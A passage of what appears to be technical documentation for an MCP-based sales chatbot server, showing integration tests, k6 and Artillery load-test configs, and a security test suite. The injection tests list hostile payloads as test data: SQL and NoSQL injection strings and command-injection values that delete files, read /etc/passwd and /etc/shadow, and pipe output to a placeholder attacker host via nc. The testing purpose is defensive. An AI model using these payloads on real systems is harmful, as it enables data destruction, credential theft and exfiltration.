      expect(page1).toHaveLength(5);
    });
  });
});

### 10.3 Integration Testing

```typescript
// tests/integration/setup.ts
import { beforeAll, afterAll, beforeEach, afterEach } from 'vitest';
import { Redis } from 'ioredis';
import { Pool } from 'pg';
import { GenericContainer, StartedTestContainer } from 'testcontainers';

/**
 * Integration test environment
 */
export class IntegrationTestEnvironment {
  private static instance: IntegrationTestEnvironment;
  
  private redisContainer?: StartedTestContainer;
  private postgresContainer?: StartedTestContainer;
  
  public redis?: Redis;
  public pool?: Pool;
  
  private constructor() {}
  
  static getInstance(): IntegrationTestEnvironment {
    if (!this.instance) {
      this.instance = new IntegrationTestEnvironment();
    }
    return this.instance;
  }
  
  /**
   * Start test containers
   */
  async start(): Promise<void> {
    // Start Redis
    this.redisContainer = await new GenericContainer('redis:8.4-alpine')
      .withExposedPorts(6379)
      .withStartupTimeout(60000)
      .start();
    
    // Start PostgreSQL
    this.postgresContainer = await new GenericContainer('postgres:18.1-alpine')
      .withEnvironment({
        POSTGRES_DB: 'cerniq_test',
        POSTGRES_USER: 'test',
        POSTGRES_PASSWORD: 'test'
      })
      .withExposedPorts(5432)
      .withStartupTimeout(60000)
      .start();
    
    // Create connections
    this.redis = new Redis({
      host: this.redisContainer.getHost(),
      port: this.redisContainer.getMappedPort(6379)
    });
    
    this.pool = new Pool({
      host: this.postgresContainer.getHost(),
      port: this.postgresContainer.getMappedPort(5432),
      database: 'cerniq_test',
      user: 'test',
      password: 'test'
    });
    
    // Run migrations
    await this.runMigrations();
  }
  
  /**
   * Run database migrations
   */
  private async runMigrations(): Promise<void> {
    const migrations = [
      // Tenants
      `CREATE TABLE IF NOT EXISTS tenants (
        id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
        name VARCHAR(255) NOT NULL,
        tier VARCHAR(50) DEFAULT 'free',
        status VARCHAR(50) DEFAULT 'active',
        settings JSONB DEFAULT '{}',
        created_at TIMESTAMPTZ DEFAULT NOW(),
        updated_at TIMESTAMPTZ DEFAULT NOW()
      )`,
      
      // Sessions
      `CREATE TABLE IF NOT EXISTS mcp_sessions (
        id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
        tenant_id UUID NOT NULL REFERENCES tenants(id),
        user_id VARCHAR(255) NOT NULL,
        status VARCHAR(50) DEFAULT 'active',
        metadata JSONB DEFAULT '{}',
        created_at TIMESTAMPTZ DEFAULT NOW(),
        expires_at TIMESTAMPTZ NOT NULL,
        CONSTRAINT fk_tenant FOREIGN KEY (tenant_id) REFERENCES tenants(id) ON DELETE CASCADE
      )`,
      
      // Conversations
      `CREATE TABLE IF NOT EXISTS conversations (
        id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
        tenant_id UUID NOT NULL REFERENCES tenants(id),
        session_id UUID NOT NULL REFERENCES mcp_sessions(id),
        customer_id VARCHAR(20),
        channel VARCHAR(50) NOT NULL,
        status VARCHAR(50) DEFAULT 'active',
        context JSONB DEFAULT '{}',
        started_at TIMESTAMPTZ DEFAULT NOW(),
        ended_at TIMESTAMPTZ,
        last_activity_at TIMESTAMPTZ DEFAULT NOW()
      )`,
      
      // Messages
      `CREATE TABLE IF NOT EXISTS messages (
        id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
        conversation_id UUID NOT NULL REFERENCES conversations(id) ON DELETE CASCADE,
        role VARCHAR(50) NOT NULL,
        content TEXT NOT NULL,
        tool_calls JSONB,
        metadata JSONB DEFAULT '{}',
        created_at TIMESTAMPTZ DEFAULT NOW()
      )`,
      
      // Products
      `CREATE TABLE IF NOT EXISTS products (
        id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
        tenant_id UUID NOT NULL REFERENCES tenants(id),
        sku VARCHAR(100) NOT NULL,
        name VARCHAR(255) NOT NULL,
        category VARCHAR(100),
        price DECIMAL(15, 2),
        currency CHAR(3) DEFAULT 'RON',
        unit VARCHAR(50),
        stock INTEGER DEFAULT 0,
        min_order INTEGER DEFAULT 1,
        description TEXT,
        specifications JSONB DEFAULT '{}',
        created_at TIMESTAMPTZ DEFAULT NOW(),
        updated_at TIMESTAMPTZ DEFAULT NOW(),
        UNIQUE(tenant_id, sku)
      )`,
      
      // Orders
      `CREATE TABLE IF NOT EXISTS orders (
        id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
        tenant_id UUID NOT NULL REFERENCES tenants(id),
        customer_id VARCHAR(20) NOT NULL,
        conversation_id UUID REFERENCES conversations(id),
        status VARCHAR(50) DEFAULT 'pending',
        items JSONB NOT NULL,
        subtotal DECIMAL(15, 2),
        tax DECIMAL(15, 2),
        total DECIMAL(15, 2),
        currency CHAR(3) DEFAULT 'RON',
        requires_approval BOOLEAN DEFAULT FALSE,
        approval_status VARCHAR(50),
        created_at TIMESTAMPTZ DEFAULT NOW(),
        updated_at TIMESTAMPTZ DEFAULT NOW()
      )`,
      
      // Indexes
      `CREATE INDEX IF NOT EXISTS idx_sessions_tenant ON mcp_sessions(tenant_id)`,
      `CREATE INDEX IF NOT EXISTS idx_conversations_tenant ON conversations(tenant_id)`,
      `CREATE INDEX IF NOT EXISTS idx_conversations_customer ON conversations(customer_id)`,
      `CREATE INDEX IF NOT EXISTS idx_messages_conversation ON messages(conversation_id)`,
      `CREATE INDEX IF NOT EXISTS idx_products_tenant_category ON products(tenant_id, category)`,
      `CREATE INDEX IF NOT EXISTS idx_orders_tenant_customer ON orders(tenant_id, customer_id)`
    ];
    
    for (const migration of migrations) {
      await this.pool!.query(migration);
    }
  }
  
  /**
   * Clean database between tests
   */
  async clean(): Promise<void> {
    await this.pool?.query('TRUNCATE messages, orders, conversations, mcp_sessions, products, tenants CASCADE');
    await this.redis?.flushdb();
  }
  
  /**
   * Seed test data
   */
  async seed(): Promise<SeedData> {
    // Create test tenant
    const tenantResult = await this.pool!.query(`
      INSERT INTO tenants (id, name, tier, status, settings)
      VALUES ($1, $2, $3, $4, $5)
      RETURNING *
    `, [
      'a0000000-0000-0000-0000-000000000001',
      'Test Tenant',
      'professional',
      'active',
      JSON.stringify({
        maxSessions: 100,
        maxTokensPerDay: 1000000
      })
    ]);
    
    // Create test products
    const products = [
      {
        id: 'b0000000-0000-0000-0000-000000000001',
        sku: 'NPK-15-15-15',
        name: 'Îngrășământ NPK 15-15-15',
        category: 'fertilizers',
        price: 180.00,
        unit: 'kg',
        stock: 5000,
        minOrder: 100
      },
      {
        id: 'b0000000-0000-0000-0000-000000000002',
        sku: 'WHEAT-SEED-A',
        name: 'Semințe grâu Apache',
        category: 'seeds',
        price: 2.50,
        unit: 'kg',
        stock: 20000,
        minOrder: 1000
      }
    ];
    
    for (const product of products) {
      await this.pool!.query(`
        INSERT INTO products (id, tenant_id, sku, name, category, price, unit, stock, min_order)
        VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)
      `, [
        product.id,
        tenantResult.rows[0].id,
        product.sku,
        product.name,
        product.category,
        product.price,
        product.unit,
        product.stock,
        product.minOrder
      ]);
    }
    
    return {
      tenant: tenantResult.rows[0],
      products
    };
  }
  
  /**
   * Stop test containers
   */
  async stop(): Promise<void> {
    await this.redis?.quit();
    await this.pool?.end();
    await this.redisContainer?.stop();
    await this.postgresContainer?.stop();
  }
}

interface SeedData {
  tenant: any;
  products: any[];
}

// Global setup
let env: IntegrationTestEnvironment;

beforeAll(async () => {
  env = IntegrationTestEnvironment.getInstance();
  await env.start();
}, 120000);

afterAll(async () => {
  await env.stop();
});

beforeEach(async () => {
  await env.clean();
});

export { env };

// tests/integration/conversation-flow.test.ts
import { describe, it, expect, beforeEach } from 'vitest';
import { env } from './setup';
import { MCPServer } from '../../src/server';
import { ConversationManager } from '../../src/conversation/manager';
import { ToolExecutor } from '../../src/tools/executor';

describe('Conversation Flow Integration', () => {
  let server: MCPServer;
  let conversationManager: ConversationManager;
  let seedData: any;
  
  beforeEach(async () => {
    seedData = await env.seed();
    
    server = new MCPServer({
      redis: env.redis!,
      pool: env.pool!
    });
    
    conversationManager = server.getConversationManager();
  });
  
  describe('Complete sales conversation', () => {
    it('should handle full product inquiry to order flow', async () => {
      const tenantContext = {
        tenantId: seedData.tenant.id,
        userId: 'test-user-001',
        permissions: ['tool:execute', 'resource:read', 'resource:write']
      };
      
      // Create session
      const session = await server.createSession({
        tenantId: tenantContext.tenantId,
        userId: tenantContext.userId,
        expiresIn: 3600
      });
      
      expect(session.status).toBe('active');
      
      // Start conversation
      const conversation = await conversationManager.createConversation({
        tenantContext,
        session,
        customerId: 'RO12345678',
        channel: 'web_chat'
      });
      
      expect(conversation.status).toBe('active');
      
      // User asks about products
      await conversationManager.addMessage(conversation.id, {
        role: 'user',
        content: 'Ce îngrășăminte aveți pentru grâu?'
      });
      
      // Generate AI response (mocked for integration test)
      const response1 = await conversationManager.generateResponse(conversation);
      
      expect(response1.content).toBeDefined();
      
      // User requests specific product
      await conversationManager.addMessage(conversation.id, {
        role: 'user',
        content: 'Vreau să comand 500 kg de NPK 15-15-15'
      });
      
      // AI should use check_inventory tool
      const response2 = await conversationManager.generateResponse(conversation);
      
      if (response2.toolCalls?.length > 0) {
        // Execute tool
        const toolExecutor = server.getToolExecutor();
        const toolResult = await toolExecutor.execute(
          response2.toolCalls[0].name,
          response2.toolCalls[0].arguments,
          { tenantContext }
        );
        
        expect(toolResult.success).toBe(true);
      }
      
      // Verify conversation state
      const updatedConversation = await conversationManager.get(conversation.id);
      
      expect(updatedConversation.messages.length).toBeGreaterThan(2);
    });
    
    it('should handle escalation to human', async () => {
      const tenantContext = {
        tenantId: seedData.tenant.id,
        userId: 'test-user-001',
        permissions: ['tool:execute']
      };
      
      const session = await server.createSession({
        tenantId: tenantContext.tenantId,
        userId: tenantContext.userId,
        expiresIn: 3600
      });
      
      const conversation = await conversationManager.createConversation({
        tenantContext,
        session,
        customerId: 'RO12345678',
        channel: 'web_chat'
      });
      
      // User requests human
      await conversationManager.addMessage(conversation.id, {
        role: 'user',
        content: 'Vreau să vorbesc cu un operator uman'
      });
      
      // AI should escalate
      const response = await conversationManager.generateResponse(conversation);
      
      // Check for escalation
      const toolExecutor = server.getToolExecutor();
      const escalationTool = response.toolCalls?.find(tc => tc.name === 'escalate_to_human');
      
      if (escalationTool) {
        const result = await toolExecutor.execute(
          'escalate_to_human',
          {
            conversationId: conversation.id,
            reason: 'customer_request',
            priority: 'high'
          },
          { tenantContext }
        );
        
        expect(result.result.status).toBe('queued');
      }
      
      // Verify conversation status
      const updatedConversation = await conversationManager.get(conversation.id);
      expect(['active', 'escalated']).toContain(updatedConversation.status);
    });
  });
  
  describe('Multi-turn conversation', () => {
    it('should maintain context across messages', async () => {
      const tenantContext = {
        tenantId: seedData.tenant.id,
        userId: 'test-user-001',
        permissions: ['tool:execute', 'resource:read']
      };
      
      const session = await server.createSession({
        tenantId: tenantContext.tenantId,
        userId: tenantContext.userId
      });
      
      const conversation = await conversationManager.createConversation({
        tenantContext,
        session,
        customerId: 'RO12345678',
        channel: 'web_chat'
      });
      
      // Turn 1: Ask about NPK
      await conversationManager.addMessage(conversation.id, {
        role: 'user',
        content: 'Cât costă NPK 15-15-15?'
      });
      
      const response1 = await conversationManager.generateResponse(conversation);
      
      // Turn 2: Follow-up question (should remember NPK context)
      await conversationManager.addMessage(conversation.id, {
        role: 'user',
        content: 'Dar pentru cantități mari aveți discount?'
      });
      
      const response2 = await conversationManager.generateResponse(conversation);
      
      // Verify context was maintained
      const fullConversation = await conversationManager.get(conversation.id);
      
      expect(fullConversation.messages).toHaveLength(4); // 2 user + 2 assistant
      expect(fullConversation.context.lastProductDiscussed).toBeDefined();
    });
  });
});

// tests/integration/tool-execution.test.ts
import { describe, it, expect, beforeEach } from 'vitest';
import { env } from './setup';
import { ToolExecutor } from '../../src/tools/executor';
import { registerAllTools } from '../../src/tools/registry';

describe('Tool Execution Integration', () => {
  let toolExecutor: ToolExecutor;
  let seedData: any;
  
  beforeEach(async () => {
    seedData = await env.seed();
    
    toolExecutor = new ToolExecutor({
      redis: env.redis!,
      pool: env.pool!
    });
    
    registerAllTools(toolExecutor);
  });
  
  describe('search_products', () => {
    it('should search products in database', async () => {
      const tenantContext = {
        tenantId: seedData.tenant.id,
        permissions: ['tool:execute']
      };
      
      const result = await toolExecutor.execute('search_products', {
        query: 'NPK',
        limit: 10
      }, { tenantContext });
      
      expect(result.success).toBe(true);
      expect(result.result.products).toHaveLength(1);
      expect(result.result.products[0].sku).toBe('NPK-15-15-15');
    });
    
    it('should filter by category', async () => {
      const tenantContext = {
        tenantId: seedData.tenant.id,
        permissions: ['tool:execute']
      };
      
      const result = await toolExecutor.execute('search_products', {
        category: 'seeds',
        limit: 10
      }, { tenantContext });
      
      expect(result.success).toBe(true);
      expect(result.result.products.every(p => p.category === 'seeds')).toBe(true);
    });
  });
  
  describe('create_order', () => {
    it('should create order with inventory check', async () => {
      const tenantContext = {
        tenantId: seedData.tenant.id,
        permissions: ['tool:execute', 'order:create']
      };
      
      const result = await toolExecutor.execute('create_order', {
        customerId: 'RO12345678',
        items: [
          { sku: 'NPK-15-15-15', quantity: 200 }
        ]
      }, { tenantContext });
      
      expect(result.success).toBe(true);
      expect(result.result.orderId).toBeDefined();
      expect(result.result.total).toBe(200 * 180.00 * 1.19); // qty * price * TVA
      
      // Verify order in database
      const orderQuery = await env.pool!.query(
        'SELECT * FROM orders WHERE id = $1',
        [result.result.orderId]
      );
      
      expect(orderQuery.rows).toHaveLength(1);
      expect(orderQuery.rows[0].status).toBe('pending');
    });
    
    it('should reject order when insufficient stock', async () => {
      const tenantContext = {
        tenantId: seedData.tenant.id,
        permissions: ['tool:execute', 'order:create']
      };
      
      await expect(
        toolExecutor.execute('create_order', {
          customerId: 'RO12345678',
          items: [
            { sku: 'NPK-15-15-15', quantity: 10000 } // More than stock
          ]
        }, { tenantContext })
      ).rejects.toThrow(/stoc insuficient|insufficient stock/i);
    });
  });
  
  describe('calculate_quote', () => {
    it('should calculate quote with volume discount', async () => {
      const tenantContext = {
        tenantId: seedData.tenant.id,
        permissions: ['tool:execute']
      };
      
      const result = await toolExecutor.execute('calculate_quote', {
        customerId: 'RO12345678',
        items: [
          { sku: 'NPK-15-15-15', quantity: 1000 }
        ]
      }, { tenantContext });
      
      expect(result.success).toBe(true);
      expect(result.result.discountApplied).toBe(true);
      expect(result.result.discountPercentage).toBeGreaterThan(0);
      expect(result.result.finalPrice).toBeLessThan(1000 * 180.00);
    });
  });
});

### 10.4 Load Testing

```typescript
// tests/load/config.ts
/**
 * Load test configuration
 */
export const loadTestConfig = {
  baseUrl: process.env.MCP_BASE_URL || 'http://localhost:3000',
  
  scenarios: {
    smoke: {
      executor: 'constant-vus',
      vus: 1,
      duration: '1m',
      thresholds: {
        http_req_duration: ['p(95)<500'],
        http_req_failed: ['rate<0.01']
      }
    },
    
    load: {
      executor: 'ramping-vus',
      startVUs: 0,
      stages: [
        { duration: '2m', target: 50 },
        { duration: '5m', target: 50 },
        { duration: '2m', target: 100 },
        { duration: '5m', target: 100 },
        { duration: '2m', target: 0 }
      ],
      thresholds: {
        http_req_duration: ['p(95)<1000', 'p(99)<2000'],
        http_req_failed: ['rate<0.05']
      }
    },
    
    stress: {
      executor: 'ramping-vus',
      startVUs: 0,
      stages: [
        { duration: '2m', target: 100 },
        { duration: '5m', target: 200 },
        { duration: '2m', target: 300 },
        { duration: '5m', target: 300 },
        { duration: '5m', target: 0 }
      ],
      thresholds: {
        http_req_duration: ['p(95)<2000'],
        http_req_failed: ['rate<0.10']
      }
    },
    
    spike: {
      executor: 'ramping-vus',
      startVUs: 10,
      stages: [
        { duration: '10s', target: 10 },
        { duration: '1m', target: 500 },
        { duration: '3m', target: 500 },
        { duration: '10s', target: 10 },
        { duration: '2m', target: 10 }
      ],
      thresholds: {
        http_req_duration: ['p(95)<5000'],
        http_req_failed: ['rate<0.15']
      }
    },
    
    soak: {
      executor: 'constant-vus',
      vus: 50,
      duration: '4h',
      thresholds: {
        http_req_duration: ['p(95)<1500'],
        http_req_failed: ['rate<0.05'],
        memory_used: ['max<80%']
      }
    }
  },
  
  thresholds: {
    global: {
      http_req_duration: ['p(50)<200', 'p(95)<500', 'p(99)<1000'],
      http_req_failed: ['rate<0.01'],
      http_reqs: ['rate>100'],
      checks: ['rate>0.99']
    }
  }
};

// tests/load/k6-mcp-test.js
import http from 'k6/http';
import { check, sleep, group } from 'k6';
import { Counter, Trend, Rate } from 'k6/metrics';
import { randomItem, randomIntBetween } from 'https://jslib.k6.io/k6-utils/1.2.0/index.js';

// Custom metrics
const sessionCreated = new Counter('mcp_sessions_created');
const conversationCreated = new Counter('mcp_conversations_created');
const messagesSent = new Counter('mcp_messages_sent');
const toolExecutions = new Counter('mcp_tool_executions');
const llmLatency = new Trend('mcp_llm_latency');
const toolLatency = new Trend('mcp_tool_latency');
const errorRate = new Rate('mcp_error_rate');

// Test configuration
export const options = {
  scenarios: {
    conversation_flow: {
      executor: 'ramping-vus',
      startVUs: 0,
      stages: [
        { duration: '1m', target: 20 },
        { duration: '3m', target: 50 },
        { duration: '2m', target: 100 },
        { duration: '5m', target: 100 },
        { duration: '2m', target: 0 }
      ],
      gracefulRampDown: '30s'
    }
  },
  thresholds: {
    http_req_duration: ['p(95)<2000'],
    http_req_failed: ['rate<0.05'],
    mcp_llm_latency: ['p(95)<5000'],
    mcp_tool_latency: ['p(95)<1000'],
    mcp_error_rate: ['rate<0.05']
  }
};

const BASE_URL = __ENV.MCP_BASE_URL || 'http://localhost:3000';

// Sample user messages
const userMessages = [
  'Bună ziua, caut îngrășăminte pentru grâu',
  'Ce preț are NPK 15-15-15?',
  'Aveți în stoc semințe de porumb?',
  'Vreau să comand 500 kg de îngrășământ',
  'Ce transport oferiți?',
  'Puteți face livrare săptămâna viitoare?',
  'Aveți discount pentru comenzi mari?',
  'Vreau să vorbesc cu cineva despre o problemă'
];

// Sample customer IDs
const customerIds = [
  'RO12345678', 'RO23456789', 'RO34567890', 
  'RO45678901', 'RO56789012', 'RO67890123'
];

/**
 * Setup - create test tenant and get auth token
 */
export function setup() {
  const authResponse = http.post(`${BASE_URL}/api/auth/token`, JSON.stringify({
    tenantId: 'test-tenant-load',
    apiKey: __ENV.MCP_API_KEY || 'test-api-key'
  }), {
    headers: { 'Content-Type': 'application/json' }
  });
  
  return {
    token: authResponse.json('token'),
    tenantId: 'test-tenant-load'
  };
}

/**
 * Main test scenario
 */
export default function(data) {
  const headers = {
    'Content-Type': 'application/json',
    'Authorization': `Bearer ${data.token}`,
    'X-Tenant-ID': data.tenantId
  };
  
  group('Session Management', function() {
    // Create session
    const sessionStart = Date.now();
    const sessionResponse = http.post(`${BASE_URL}/api/mcp/sessions`, JSON.stringify({
      userId: `user-${__VU}-${__ITER}`,
      metadata: { source: 'k6-load-test' }
    }), { headers });
    
    const sessionSuccess = check(sessionResponse, {
      'session created': (r) => r.status === 201,
      'session has id': (r) => r.json('id') !== undefined
    });
    
    if (!sessionSuccess) {
      errorRate.add(1);
      return;
    }
    
    sessionCreated.add(1);
    const sessionId = sessionResponse.json('id');
    
    sleep(randomIntBetween(1, 3));
    
    // Create conversation
    group('Conversation Flow', function() {
      const convResponse = http.post(`${BASE_URL}/api/mcp/conversations`, JSON.stringify({
        sessionId: sessionId,
        customerId: randomItem(customerIds),
        channel: 'web_chat'
      }), { headers });
      
      const convSuccess = check(convResponse, {
        'conversation created': (r) => r.status === 201,
        'conversation has id': (r) => r.json('id') !== undefined
      });
      
      if (!convSuccess) {
        errorRate.add(1);
        return;
      }
      
      conversationCreated.add(1);
      const conversationId = convResponse.json('id');
      
      // Simulate multi-turn conversation
      const turns = randomIntBetween(2, 5);
      
      for (let i = 0; i < turns; i++) {
        sleep(randomIntBetween(2, 5));
        
        // Send user message
        const msgResponse = http.post(
          `${BASE_URL}/api/mcp/conversations/${conversationId}/messages`,
          JSON.stringify({
            role: 'user',
            content: randomItem(userMessages)
          }),
          { headers }
        );
        
        check(msgResponse, {
          'message sent': (r) => r.status === 201
        });
        
        messagesSent.add(1);
        
        // Generate AI response
        const llmStart = Date.now();
        const genResponse = http.post(
          `${BASE_URL}/api/mcp/conversations/${conversationId}/generate`,
          JSON.stringify({ maxTokens: 512 }),
          { headers, timeout: '30s' }
        );
        
        const llmDuration = Date.now() - llmStart;
        llmLatency.add(llmDuration);
        
        const genSuccess = check(genResponse, {
          'response generated': (r) => r.status === 200,
          'response has content': (r) => r.json('content') !== undefined
        });
        
        if (!genSuccess) {
          errorRate.add(1);
          continue;
        }
        
        // Handle tool calls if any
        const toolCalls = genResponse.json('toolCalls') || [];
        
        for (const toolCall of toolCalls) {
          const toolStart = Date.now();
          const toolResponse = http.post(
            `${BASE_URL}/api/mcp/tools/execute`,
            JSON.stringify({
              conversationId: conversationId,
              toolCallId: toolCall.id,
              name: toolCall.name,
              arguments: toolCall.arguments
            }),
            { headers }
          );
          
          const toolDuration = Date.now() - toolStart;
          toolLatency.add(toolDuration);
          toolExecutions.add(1);
          
          check(toolResponse, {
            'tool executed': (r) => r.status === 200
          });
        }
      }
      
      // End conversation
      sleep(1);
      
      const endResponse = http.patch(
        `${BASE_URL}/api/mcp/conversations/${conversationId}`,
        JSON.stringify({ status: 'completed' }),
        { headers }
      );
      
      check(endResponse, {
        'conversation ended': (r) => r.status === 200
      });
    });
    
    // Delete session
    http.del(`${BASE_URL}/api/mcp/sessions/${sessionId}`, null, { headers });
  });
  
  sleep(randomIntBetween(1, 5));
}

/**
 * Teardown - cleanup
 */
export function teardown(data) {
  console.log('Load test completed');
}

// tests/load/k6-tool-stress.js
import http from 'k6/http';
import { check, sleep } from 'k6';
import { Trend, Counter } from 'k6/metrics';

const toolLatency = new Trend('tool_execution_latency');
const toolErrors = new Counter('tool_execution_errors');

export const options = {
  scenarios: {
    tool_stress: {
      executor: 'constant-arrival-rate',
      rate: 100,
      timeUnit: '1s',
      duration: '5m',
      preAllocatedVUs: 50,
      maxVUs: 200
    }
  },
  thresholds: {
    tool_execution_latency: ['p(95)<500', 'p(99)<1000'],
    tool_execution_errors: ['count<100']
  }
};

const tools = [
  { name: 'search_products', args: { query: 'NPK', limit: 10 } },
  { name: 'check_inventory', args: { sku: 'NPK-15-15-15', quantity: 100 } },
  { name: 'get_customer_info', args: { customerId: 'RO12345678' } },
  { name: 'calculate_quote', args: { items: [{ sku: 'NPK-15-15-15', quantity: 500 }] } }
];

export function setup() {
  const authResponse = http.post(`${__ENV.MCP_BASE_URL}/api/auth/token`, JSON.stringify({
    tenantId: 'test-tenant',
    apiKey: __ENV.MCP_API_KEY
  }), { headers: { 'Content-Type': 'application/json' } });
  
  return { token: authResponse.json('token') };
}

export default function(data) {
  const headers = {
    'Content-Type': 'application/json',
    'Authorization': `Bearer ${data.token}`
  };
  
  const tool = tools[Math.floor(Math.random() * tools.length)];
  
  const start = Date.now();
  const response = http.post(`${__ENV.MCP_BASE_URL}/api/mcp/tools/execute`, JSON.stringify({
    name: tool.name,
    arguments: tool.args
  }), { headers });
  
  toolLatency.add(Date.now() - start);
  
  const success = check(response, {
    'status is 200': (r) => r.status === 200,
    'has result': (r) => r.json('result') !== undefined
  });
  
  if (!success) {
    toolErrors.add(1);
  }
}

// tests/load/artillery-config.yaml
config:
  target: "{{ $processEnvironment.MCP_BASE_URL }}"
  phases:
    - duration: 60
      arrivalRate: 5
      name: Warm up
    - duration: 300
      arrivalRate: 20
      name: Sustained load
    - duration: 120
      arrivalRate: 50
      name: Peak load
    - duration: 60
      arrivalRate: 5
      name: Cool down
  
  defaults:
    headers:
      Content-Type: "application/json"
  
  plugins:
    expect: {}
    metrics-by-endpoint: {}
  
  variables:
    tenantId: "test-tenant"
  
  http:
    timeout: 30

scenarios:
  - name: "MCP Conversation Flow"
    weight: 70
    flow:
      - post:
          url: "/api/mcp/sessions"
          json:
            userId: "artillery-{{ $uuid }}"
          capture:
            - json: "$.id"
              as: "sessionId"
          expect:
            - statusCode: 201
      
      - think: 1
      
      - post:
          url: "/api/mcp/conversations"
          json:
            sessionId: "{{ sessionId }}"
            customerId: "RO12345678"
            channel: "web_chat"
          capture:
            - json: "$.id"
              as: "conversationId"
          expect:
            - statusCode: 201
      
      - think: 2
      
      - loop:
          - post:
              url: "/api/mcp/conversations/{{ conversationId }}/messages"
              json:
                role: "user"
                content: "{{ $randomString(50) }}"
              expect:
                - statusCode: 201
          - think: 1
          - post:
              url: "/api/mcp/conversations/{{ conversationId }}/generate"
              expect:
                - statusCode: 200
          - think: 3
        count: 3
      
      - patch:
          url: "/api/mcp/conversations/{{ conversationId }}"
          json:
            status: "completed"
          expect:
            - statusCode: 200
      
      - delete:
          url: "/api/mcp/sessions/{{ sessionId }}"

  - name: "Tool Execution Only"
    weight: 30
    flow:
      - post:
          url: "/api/mcp/tools/execute"
          json:
            name: "search_products"
            arguments:
              query: "{{ $randomString(10) }}"
              limit: 10
          expect:
            - statusCode: 200
            - hasProperty: "result"
```

### 10.5 Security Testing

Security testing ensures the MCP Server is protected against common vulnerabilities and attack vectors.

#### 10.5.1 Security Test Suite

```typescript
// tests/security/mcp-security.test.ts

import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { MCPSecurityTester } from './security-tester';
import { createTestServer, TestServer } from '../test-utils';

describe('MCP Security Tests', () => {
  let server: TestServer;
  let securityTester: MCPSecurityTester;

  beforeAll(async () => {
    server = await createTestServer();
    securityTester = new MCPSecurityTester(server.baseUrl);
  });

  afterAll(async () => {
    await server.close();
  });

  describe('Authentication Security', () => {
    it('should reject requests without authentication', async () => {
      const response = await securityTester.makeRequest({
        method: 'POST',
        path: '/api/mcp/conversations',
        headers: {},
        body: { customerId: 'test' }
      });

      expect(response.status).toBe(401);
      expect(response.body.error).toBe('Authentication required');
    });

    it('should reject expired tokens', async () => {
      const expiredToken = securityTester.generateExpiredToken();
      
      const response = await securityTester.makeRequest({
        method: 'GET',
        path: '/api/mcp/sessions',
        headers: { Authorization: `Bearer ${expiredToken}` }
      });

      expect(response.status).toBe(401);
      expect(response.body.error).toBe('Token expired');
    });

    it('should reject tampered tokens', async () => {
      const tamperedToken = securityTester.generateTamperedToken();
      
      const response = await securityTester.makeRequest({
        method: 'GET',
        path: '/api/mcp/sessions',
        headers: { Authorization: `Bearer ${tamperedToken}` }
      });

      expect(response.status).toBe(401);
      expect(response.body.error).toBe('Invalid token');
    });

    it('should prevent timing attacks on authentication', async () => {
      const timings: number[] = [];
      
      for (let i = 0; i < 100; i++) {
        const start = performance.now();
        await securityTester.makeRequest({
          method: 'POST',
          path: '/api/auth/login',
          body: {
            username: 'nonexistent@test.com',
            password: `password${i}`
          }
        });
        timings.push(performance.now() - start);
      }

      const stdDev = calculateStdDev(timings);
      expect(stdDev).toBeLessThan(50); // Low variance indicates timing-safe
    });

    it('should enforce brute force protection', async () => {
      const attempts: Promise<any>[] = [];
      
      for (let i = 0; i < 10; i++) {
        attempts.push(
          securityTester.makeRequest({
            method: 'POST',
            path: '/api/auth/login',
            body: {
              username: 'test@test.com',
              password: 'wrongpassword'
            }
          })
        );
      }

      const responses = await Promise.all(attempts);
      const blockedResponses = responses.filter(r => r.status === 429);
      
      expect(blockedResponses.length).toBeGreaterThan(0);
    });
  });

  describe('Authorization Security', () => {
    it('should prevent cross-tenant access', async () => {
      const tenant1Token = await securityTester.getAuthToken('tenant1');
      const tenant2ResourceId = 'tenant2-resource-123';

      const response = await securityTester.makeRequest({
        method: 'GET',
        path: `/api/mcp/resources/${tenant2ResourceId}`,
        headers: { Authorization: `Bearer ${tenant1Token}` }
      });

      expect(response.status).toBe(403);
      expect(response.body.error).toContain('Access denied');
    });

    it('should enforce role-based access control', async () => {
      const viewerToken = await securityTester.getAuthToken('viewer');

      const response = await securityTester.makeRequest({
        method: 'DELETE',
        path: '/api/mcp/conversations/conv-123',
        headers: { Authorization: `Bearer ${viewerToken}` }
      });

      expect(response.status).toBe(403);
      expect(response.body.error).toContain('Permission denied');
    });

    it('should validate resource ownership', async () => {
      const user1Token = await securityTester.getAuthToken('user1');
      const user2ConversationId = 'user2-conv-456';

      const response = await securityTester.makeRequest({
        method: 'GET',
        path: `/api/mcp/conversations/${user2ConversationId}`,
        headers: { Authorization: `Bearer ${user1Token}` }
      });

      expect(response.status).toBe(403);
    });
  });

  describe('Injection Attacks', () => {
    it('should prevent SQL injection', async () => {
      const token = await securityTester.getAuthToken('user1');
      const maliciousPayloads = [
        "'; DROP TABLE conversations; --",
        "1 OR 1=1",
        "1; DELETE FROM sessions",
        "UNION SELECT * FROM users",
        "' OR ''='"
      ];

      for (const payload of maliciousPayloads) {
        const response = await securityTester.makeRequest({
          method: 'GET',
          path: `/api/mcp/conversations?search=${encodeURIComponent(payload)}`,
          headers: { Authorization: `Bearer ${token}` }
        });

        // Should either sanitize or reject, but not execute
        expect([200, 400]).toContain(response.status);
        
        // Verify no data leak
        if (response.status === 200) {
          expect(response.body.data).not.toContainEqual(
            expect.objectContaining({ tenantId: expect.not.stringMatching(/tenant1/) })
          );
        }
      }
    });

    it('should prevent NoSQL injection', async () => {
      const token = await securityTester.getAuthToken('user1');
      const maliciousPayloads = [
        { "$gt": "" },
        { "$ne": null },
        { "$where": "function() { return true; }" },
        { "$regex": ".*" }
      ];

      for (const payload of maliciousPayloads) {
        const response = await securityTester.makeRequest({
          method: 'POST',
          path: '/api/mcp/conversations/search',
          headers: { Authorization: `Bearer ${token}` },
          body: { query: payload }
        });

        expect([200, 400]).toContain(response.status);
      }
    });

    it('should prevent command injection', async () => {
      const token = await securityTester.getAuthToken('admin');
      const maliciousPayloads = [
        "test; rm -rf /",
        "test && cat /etc/passwd",
        "test | nc attacker.com 1234",
        "`whoami`",
        "$(cat /etc/shadow)"
      ];

      for (const payload of maliciousPayloads) {
        const response = await securityTester.makeRequest({
          method: 'POST',
